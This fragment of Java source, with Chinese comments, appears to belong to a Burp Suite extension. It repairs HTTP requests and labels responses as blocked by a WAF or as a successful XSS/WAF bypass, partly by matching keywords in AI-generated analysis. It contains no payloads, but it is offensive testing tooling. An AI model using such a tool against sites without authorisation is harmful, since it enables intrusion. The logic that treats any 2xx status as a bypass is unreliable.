        StringBuilder bodyBuilder = new StringBuilder();

        // 维护一个头部集合以防止重复
        java.util.Map<String, String> headers = new java.util.LinkedHashMap<>();

        // 处理所有行
        for (int i = 1; i < lines.length; i++) {
            String line = lines[i].trim();

            if (line.isEmpty()) {
                // 找到空行，表示请求头和请求体的分界
                foundEmptyLine = true;
                continue;
            }

            if (!foundEmptyLine) {
                // 仍在处理请求头
                if (line.contains(":")) {
                    String[] parts = line.split(":", 2);
                    String headerName = parts[0].trim();
                    String headerValue = parts.length > 1 ? parts[1].trim() : "";

                    // 检查重要的头部
                    String headerNameLower = headerName.toLowerCase();
                    if (headerNameLower.equals("host")) {
                        hasHost = true;
                    } else if (headerNameLower.equals("content-type")) {
                        hasContentType = true;
                    } else if (headerNameLower.equals("content-length")) {
                        hasContentLength = true;
                        // 我们稍后会重新计算
                        continue;
                    }

                    // 存储头部
                    headers.put(headerName, headerValue);
                } else {
                    logToConsole("Skipping invalid header line: " + line);
                }
            } else {
                // 收集请求体
                bodyBuilder.append(line).append("\n");
            }
        }

        // 如果没有找到空行但有内容，可能整个请求都是头部
        if (!foundEmptyLine && lines.length > 1) {
            logToConsole("No empty line found, treating all content as headers");
        }

        // 确保有Host头部
        if (!hasHost && currentHttpService != null) {
            String hostValue = currentHttpService.getHost();
            if (currentHttpService.getPort() != 80 && currentHttpService.getPort() != 443) {
                hostValue += ":" + currentHttpService.getPort();
            }
            headers.put("Host", hostValue);
            logToConsole("Added Host header: " + hostValue);
        }

        // 提取请求体
        String body = bodyBuilder.toString().trim();

        // 对于POST或PUT请求，确保必要的头部
        if (("POST".equals(method) || "PUT".equals(method))) {
            if (!hasContentType && body.length() > 0) {
                headers.put("Content-Type", "application/x-www-form-urlencoded");
                logToConsole("Added Content-Type header for " + method + " request");
            }

            if (body.length() > 0) {
                // 计算Content-Length
                int contentLength = body.getBytes(StandardCharsets.UTF_8).length;
                headers.put("Content-Length", String.valueOf(contentLength));
                logToConsole("Set Content-Length to " + contentLength);
            }
        }

        // 添加所有头部
        for (java.util.Map.Entry<String, String> header : headers.entrySet()) {
            fixedRequest.append(header.getKey()).append(": ").append(header.getValue()).append("\r\n");
        }

        // 添加空行
        fixedRequest.append("\r\n");

        // 添加请求体
        if (body.length() > 0) {
            fixedRequest.append(body);
            // 确保请求体有适当的终止
            if (!body.endsWith("\n")) {
                fixedRequest.append("\r\n");
            }
        }

        String finalRequest = fixedRequest.toString();
        logToConsole("Emergency fixed request (length: " + finalRequest.length() + " bytes):\n" + finalRequest);
        return finalRequest;
    }

    // 更新的RequestResponseAIPair类，支持更新AI响应
    private class RequestResponseAIPair {
        private byte[] request;
        private byte[] response;
        private String aiResponse;
        private int id;

        public RequestResponseAIPair(byte[] request, byte[] response, String aiResponse, int id) {
            this.request = request;
            this.response = response;
            this.aiResponse = aiResponse;
            this.id = id;
        }

        public byte[] getRequest() {
            return request;
        }

        public byte[] getResponse() {
            return response;
        }

        public String getAiResponse() {
            return aiResponse;
        }

        // 添加setter方法以支持更新AI响应
        public void setAiResponse(String aiResponse) {
            this.aiResponse = aiResponse;
        }

        public int getId() {
            return id;
        }
    }

    private class HistoryTableModel extends AbstractTableModel {
        private final String[] columnNames = {"#", "Request Length", "Response Length", "Status", "绕过判定"};

        @Override
        public int getRowCount() {
            return history.size();
        }

        @Override
        public int getColumnCount() {
            return columnNames.length;
        }

        @Override
        public String getColumnName(int column) {
            return columnNames[column];
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            RequestResponseAIPair pair = history.get(rowIndex);

            switch (columnIndex) {
                case 0:
                    return pair.getId();
                case 1:
                    return pair.getRequest().length;
                case 2:
                    return pair.getResponse().length;
                case 3:
                    // 显示真实响应码
                    try {
                        IResponseInfo responseInfo = helpers.analyzeResponse(pair.getResponse());
                        return responseInfo.getStatusCode();
                    } catch (Exception e) {
                        return "Error";
                    }
                case 4:
                    // XSS Success列，需要优先使用真实响应码判断
                    try {
                        IResponseInfo responseInfo = helpers.analyzeResponse(pair.getResponse());
                        int statusCode = responseInfo.getStatusCode();

                        // AI 分析的文本
                        String aiResp = pair.getAiResponse().toLowerCase();

                        // ---------- 这里是关键修改 ----------
                        // 1) 如果状态码是 403/400/401/406/40X，就判定为WAF拦截
                        if (statusCode == 403 || statusCode == 400
                                || statusCode == 401 || statusCode == 406
                                || (statusCode >= 400 && statusCode < 500)) {
                            return "WAF拦截"; // 你可以根据需要再细化
                        }
                        // 2) 如果状态码 2xx，才考虑是否“已绕过”
                        else if (statusCode >= 200 && statusCode < 300) {
                            // 如果AI响应包含“成功”/“绕过”等关键词
                            if (aiResp.contains("xss成功")
                                    || aiResp.contains("成功注入")
                                    || aiResp.contains("已绕过")
                                    || aiResp.contains("未被WAF拦截")
                                    || aiResp.contains("绕过了waf")) {
                                return "已绕过WAF";
                            } else {
                                // 状态码200，但AI没有明确说成功
                                return "已绕过WAF,请手工测试";
                            }
                        } else {
                            // 其他响应码（301/302/500等），可视需求判断
                            return "未确定";
                        }
                        // ---------- 关键修改结束 ----------
                    } catch (Exception e) {
                        return "Error";
                    }
                default:
                    return null;
            }
        }
    }
}
